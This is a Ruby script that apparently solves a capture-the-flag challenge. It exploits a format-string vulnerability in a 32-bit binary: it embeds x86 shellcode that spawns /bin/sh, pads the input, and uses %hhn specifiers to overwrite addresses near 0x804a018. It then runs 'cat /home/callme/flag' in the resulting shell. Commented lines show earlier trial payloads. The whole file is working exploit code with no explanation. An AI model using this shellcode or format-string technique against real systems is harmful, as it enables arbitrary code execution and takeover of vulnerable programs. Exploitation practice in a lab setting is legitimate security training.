#!/usr/bin/env ruby

shell = %Q(
 80483ea:       89 d0                   mov    %edx,%eax
 80483ec:       89 c1                   mov    %eax,%ecx
 80483ee:       89 c2                   mov    %eax,%edx
 80483f0:       83 c2 08                add    $0x8,%edx
 80483f3:       89 10                   mov    %edx,(%eax)
 80483f5:       83 c0 04                add    $0x4,%eax
 80483f8:       31 d2                   xor    %edx,%edx
 80483fa:       89 10                   mov    %edx,(%eax)
 80483fc:       83 c0 04                add    $0x4,%eax
 80483ff:       89 c3                   mov    %eax,%ebx
 8048401:       89 c2                   mov    %eax,%edx
 8048403:       c6 02 2f                movb   $0x2f,(%edx)
 8048406:       42                      inc    %edx
 8048407:       c6 02 62                movb   $0x62,(%edx)
 804840a:       42                      inc    %edx
 804840b:       c6 02 69                movb   $0x69,(%edx)
 804840e:       42                      inc    %edx
 804840f:       c6 02 6e                movb   $0x6e,(%edx)
 8048412:       42                      inc    %edx
 8048413:       c6 02 2f                movb   $0x2f,(%edx)
 8048416:       42                      inc    %edx
 8048417:       c6 02 73                movb   $0x73,(%edx)
 804841a:       42                      inc    %edx
 804841b:       c6 02 68                movb   $0x68,(%edx)
 804841e:       42                      inc    %edx
 804841f:       31 c0                   xor    %eax,%eax
 8048421:       88 02                   mov    %al,(%edx)
 8048423:       89 ca                   mov    %ecx,%edx
 8048425:       b0 0b                   mov    $0xb,%al
 8048427:       cd 80                   int    $0x80
)

shell.gsub!(/ \w+:\s+/, '')
shell.strip!
shell.gsub!(/  .*/, '')

code = shell.split.map{|b|b.hex.chr} * ''

puts 'y'

msg = "aaa"

#msg += [0x804a018].pack('L')

#msg += [0x804a018, 0x11111111, 0x11111111, 0x11111111, 0x11111111, 0x11111111, 0x11111111, 0x11111111, 0x804a019].pack('L')

msg += [0x804a019, 0x11111111, 0x804a018].pack('L*')

#"\1\1\1\1"

while msg.size != 0xaa - 0x60
  msg += 'a'
end

msg += code

while msg.size != 187
  msg += 'b'
end

#msg += '%09d' * 10 + ' %d'

msg += '%08u' + '%04hhu' * 8 + '%0104hhu' + '%hhn' + '%010hhu' + '%hhn'

#msg += '%08u' + '%04hhu' * 8 + '%0115hhu' + '%hhn' + ' %d'

#msg += '%08u' + '%04hhu' * 9 + ' %d'

#msg += '%08d %08d %d %d %d %d %d %d %d %d %d '

#msg += '%7$d %d %d %d %d %d %d %d %d %d %d '


puts msg

puts 'cat /home/callme/flag'

#puts 'a' * 267

#puts 'a' * 267 + '%x'


